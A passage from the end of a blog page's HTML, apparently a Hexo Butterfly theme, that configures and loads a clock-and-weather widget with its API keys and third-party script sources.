elist="null".split(","),cpage=location.pathname,epage="all",qweather_key="d25a9667ab544e3dab44ad64d7b79ee4",gaud_map_key="97abffdbc685d28022bb11b500a903b9",baidu_ak_key="undefined",flag=0,clock_rectangle="113.34532,23.15624",clock_default_rectangle_enable="false",i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_anzhiyu_injector_config()</script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script></body></html>